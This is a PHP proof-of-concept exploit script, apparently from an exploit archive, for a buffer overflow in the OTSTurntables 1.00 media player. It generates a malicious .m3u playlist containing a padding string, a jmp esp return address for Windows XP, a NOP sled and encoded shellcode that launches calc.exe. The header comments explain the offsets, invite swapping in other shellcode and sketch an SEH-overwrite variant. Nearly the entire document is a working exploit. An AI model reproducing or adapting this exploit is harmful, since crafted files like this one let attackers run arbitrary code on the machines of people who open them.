<?php
/*
OTSTurntables 1.00 Buffer OverFlow 0days
224 bytes available for shellcode,, you can replace it with you favourite one,, 
0x77394540      jmp esp in shell32.dll Winxp sp0
exploit : [A x 277] +[EIP - jmp esp - 4] + [Nops -10] + [Shellcode -224] 
&& if you want to exploit this vul with SEH ,, take some infos :p
[ A x 277 ] + [EIP] + [B x 608] + [Pointer to next SEH record] + [SE handler]
by : 0x58
Greetz : Midt,,miyy3t,,Diablos5s5s5,,Str0ke,, MoroCcan haxorz,,!
*/
# win32_exec -  EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com
$shellcode = 
"\x33\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x84".
"\xd1\xfe\xd8\x83\xeb\xfc\xe2\xf4\x78\x39\xba\xd8\x84\xd1\x75\x9d".
"\xb8\x5a\x82\xdd\xfc\xd0\x11\x53\xcb\xc9\x75\x87\xa4\xd0\x15\x91".
"\x0f\xe5\x75\xd9\x6a\xe0\x3e\x41\x28\x55\x3e\xac\x83\x10\x34\xd5".
"\x85\x13\x15\x2c\xbf\x85\xda\xdc\xf1\x34\x75\x87\xa0\xd0\x15\xbe".
"\x0f\xdd\xb5\x53\xdb\xcd\xff\x33\x0f\xcd\x75\xd9\x6f\x58\xa2\xfc".
"\x80\x12\xcf\x18\xe0\x5a\xbe\xe8\x01\x11\x86\xd4\x0f\x91\xf2\x53".
"\xf4\xcd\x53\x53\xec\xd9\x15\xd1\x0f\x51\x4e\xd8\x84\xd1\x75\xb0".
"\xb8\x8e\xcf\x2e\xe4\x87\x77\x20\x07\x11\x85\x88\xec\x21\x74\xdc".
"\xdb\xb9\x66\x26\x0e\xdf\xa9\x27\x63\xb2\x9f\xb4\xe7\xff\x9b\xa0".
"\xe1\xd1\xfe\xd8";
$bof = str_repeat("A",277)."\x40\x45\x39\x77".str_repeat("\x90",10).$shellcode;
$filename = "OTSTurntables.m3u";
$file = fopen($filename,"w+");
fputs($file,"#EXTM3U\r\n");
fputs($file,"#EXTINF:0,TITLE\r\n");
fputs($file,"C:/");
fputs($file,$bof);
fclose($file);
echo "Exploit generated in : ".$filename."<br>";
?>

# milw0rm.com [2007-09-02]
